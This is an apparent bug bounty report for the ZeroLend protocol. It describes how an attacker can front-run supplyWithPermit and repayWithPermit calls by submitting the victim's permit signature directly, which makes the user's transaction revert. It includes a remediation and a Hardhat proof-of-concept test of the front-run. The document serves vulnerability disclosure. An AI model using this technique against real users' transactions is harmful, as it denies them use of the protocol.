# 28970 - \[SC - Medium] Attacker can grief a user by making his supplyW\...

Submitted on Mar 3rd 2024 at 19:57:36 UTC by @djxploit for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #28970

Report type: Smart Contract

Report severity: Medium

Target: <https://pacific-explorer.manta.network/address/0x8676e39B5D2f0d6E0d78a4208a0cCBc50504972e>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When a user calls `supplyWithPermit` function, attacker can make the call revert by front-running. This happens because of a missing `try-catch` statement in the `supplyWithPermit` function.

## Vulnerability Details

When `supplyWithPermit` is called, by passing a permit signature, the contract calls the `permit` function of the asset to get approval to spend on behalf of caller. It then calls the `SupplyLogic.executeSupply` function to supply the asset.

So an attacker sees the `supplyWithPermit` call in the mempool, and extracts the permit signature from the call's argument. Attacker then use this permit signature, to directly call the asset's `permit` function. This will give the approval to the contract address, but along with it will increase the user's nonce, thus making the signature invalid for any further use.

Due to this when the original `supplyWithPermit` gets mined, it will revert, as the signature has become invalid. Hence the user's transaction will revert.

## Impact Details

Attacker can grief users by frontrunning the `supplyWithPermit` functions, making that functionality unusable by users. Apart from `supplyWithPermit` the `repayWithPermit` function is also vulnerable to this issue.

## Remediation Details

Implement a try-catch statement. Inside the `supplyWithPermit` function, call the assets `permit` statement using a try statement, and catch any revert. That will resolve the issue.

## References

<https://www.trust-security.xyz/post/permission-denied>

## Proof of Concept

Here is the test file. The specific test case showing the vulnerability is "Supply with permit test'"

```
import { expect } from 'chai';
import { BigNumber, Signer, utils } from 'ethers';
import { impersonateAccountsHardhat } from '../helpers/misc-utils';
import { ProtocolErrors, RateMode } from '../helpers/types';
import { getFirstSigner } from '@aave/deploy-v3/dist/helpers/utilities/signer';
import { makeSuite, TestEnv } from './helpers/make-suite';
import { HardhatRuntimeEnvironment } from 'hardhat/types';
import {
  evmSnapshot,
  evmRevert,
  DefaultReserveInterestRateStrategy__factory,
  VariableDebtToken__factory,
  increaseTime,
  AaveDistributionManager,
} from '@aave/deploy-v3';
import {
  InitializableImmutableAdminUpgradeabilityProxy,
  MockL2Pool__factory,
  MockL2Pool,
  L2Encoder,
  L2Encoder__factory,
} from '../types';
import { ethers, getChainId } from 'hardhat';
import {
  buildPermitParams,
  getProxyImplementation,
  getSignatureFromTypedData,
} from '../helpers/contracts-helpers';
import { getTestWallets } from './helpers/utils/wallets';
import { MAX_UINT_AMOUNT } from '../helpers/constants';
import { parseUnits } from 'ethers/lib/utils';
import { getReserveData, getUserData } from './helpers/utils/helpers';
import { calcExpectedStableDebtTokenBalance } from './helpers/utils/calculations';

declare var hre: HardhatRuntimeEnvironment;

makeSuite('Pool: L2 functions', (testEnv: TestEnv) => {
  const {
    INVALID_HF,
    NO_MORE_RESERVES_ALLOWED,
    CALLER_NOT_ATOKEN,
    NOT_CONTRACT,
    CALLER_NOT_POOL_CONFIGURATOR,
    RESERVE_ALREADY_INITIALIZED,
    INVALID_ADDRESSES_PROVIDER,
    RESERVE_ALREADY_ADDED,
    DEBT_CEILING_NOT_ZERO,
    ASSET_NOT_LISTED,
    ZERO_ADDRESS_NOT_VALID,
  } = ProtocolErrors;

  let l2Pool: MockL2Pool;

  const POOL_ID = utils.formatBytes32String('POOL');

  let encoder: L2Encoder;

  before('Deploying L2Pool', async () => {
    const { addressesProvider, poolAdmin, pool, deployer, oracle } = testEnv;
    const { deployer: deployerName } = await hre.getNamedAccounts();

    encoder = await (await new L2Encoder__factory(deployer.signer).deploy(pool.address)).deployed();

    // Deploy the mock Pool with a `dropReserve` skipping the checks
    const L2POOL_IMPL_ARTIFACT = await hre.deployments.deploy('MockL2Pool', {
      contract: 'MockL2Pool',
      from: deployerName,
      args: [addressesProvider.address],
      libraries: {
        SupplyLogic: (await hre.deployments.get('SupplyLogic')).address,
        BorrowLogic: (await hre.deployments.get('BorrowLogic')).address,
        LiquidationLogic: (await hre.deployments.get('LiquidationLogic')).address,
        EModeLogic: (await hre.deployments.get('EModeLogic')).address,
        BridgeLogic: (await hre.deployments.get('BridgeLogic')).address,
        FlashLoanLogic: (await hre.deployments.get('FlashLoanLogic')).address,
        PoolLogic: (await hre.deployments.get('PoolLogic')).address,
      },
      log: false,
    });

    const poolProxyAddress = await addressesProvider.getPool();
    const oldPoolImpl = await getProxyImplementation(addressesProvider.address, poolProxyAddress);

    // Upgrade the Pool
    await expect(
      addressesProvider.connect(poolAdmin.signer).setPoolImpl(L2POOL_IMPL_ARTIFACT.address)
    )
      .to.emit(addressesProvider, 'PoolUpdated')
      .withArgs(oldPoolImpl, L2POOL_IMPL_ARTIFACT.address);

    // Get the Pool instance
    const poolAddress = await addressesProvider.getPool();
    l2Pool = await MockL2Pool__factory.connect(poolAddress, await getFirstSigner());
    expect(await addressesProvider.setPriceOracle(oracle.address));
  });

  after(async () => {
    const { aaveOracle, addressesProvider } = testEnv;
    expect(await addressesProvider.setPriceOracle(aaveOracle.address));
  });

  it('Supply with permit test', async () => {
    // user0 is the attacker
    const { deployer, dai, aDai, users: [user0] } = testEnv;

    const chainId = Number(await getChainId());
    const nonce = await dai.nonces(deployer.address);
    const amount = utils.parseEther('10000');
    const highDeadline = '3000000000';
    const userPrivateKey = getTestWallets()[0].secretKey;
    
    const msgParams = buildPermitParams(
      chainId,
      dai.address,
      '1',
      await dai.symbol(),
      deployer.address,
      l2Pool.address,
      nonce.toNumber(),
      highDeadline,
      amount.toString()
    );
    const { v, r, s } = getSignatureFromTypedData(userPrivateKey, msgParams);

    await dai.connect(deployer.signer)['mint(uint256)'](amount);
    const referralCode = BigNumber.from(2);
    
    // Simulate frontrunning
    // Attacker see the below 'supplyWithPermit' call in mempool, so he call the permit() of DAI directly, 
    // by using the signature from the call. This will increase the nonce of the 'deployer', which
    // make the signature invalid for further use.
    await dai.connect(user0.signer)['permit(address,address,uint256,uint256,uint8,bytes32,bytes32)'](deployer.address,l2Pool.address,amount,highDeadline,v,r,s);

    // So when the actual supplyWithPermit call will get mined, it will revert, as the signature has become invalid because
    // of the frontrunning done by attacker, which increased deployer's nonce by directly calling the permit function of DAI.
    await expect(
      l2Pool.connect(deployer.signer)['supplyWithPermit(address,uint256,address,uint16,uint256,uint8,bytes32,bytes32)'](
        dai.address,
        amount,
        deployer.address,
        referralCode,
        highDeadline,
        v,
        r,
        s)
    )
      .to.be.revertedWith(
        "INVALID_SIGNATURE"
    );
  });
});
```
